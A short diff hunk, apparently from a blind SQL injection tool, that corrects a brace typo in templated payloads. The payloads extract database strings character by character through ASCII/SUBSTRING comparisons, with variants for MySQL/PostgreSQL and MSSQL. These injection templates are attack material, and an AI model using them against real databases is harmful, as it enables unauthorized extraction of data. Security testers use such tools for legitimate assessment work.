@@ -75,8 +75,8 @@ MySQL/PostgreSQL: (SELECT LENGTH({column})) > {mid}
 '''
 dump字符串
 MySQL/PostgreSQL:
-(SELECT ASCII(SUBSTRING({column},{i),1)) FROM {table} WHERE {filters} LIMIT 1) > {mid}
-(SELECT ASCII(SUBSTRING({column},{i),1)) FROM {table} WHERE {filters} ORDER BY {column} LIMIT 1 OFFSET {offset}) > {mid}
+(SELECT ASCII(SUBSTRING({column},{i},1)) FROM {table} WHERE {filters} LIMIT 1) > {mid}
+(SELECT ASCII(SUBSTRING({column},{i},1)) FROM {table} WHERE {filters} ORDER BY {column} LIMIT 1 OFFSET {offset}) > {mid}
 MSSQL
 ASCII(SUBSTRING((SELECT TOP 1 {column} FROM {table} WHERE {filters}),{i},1)) > {mid}
 ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY),{i},1)) > {mid}
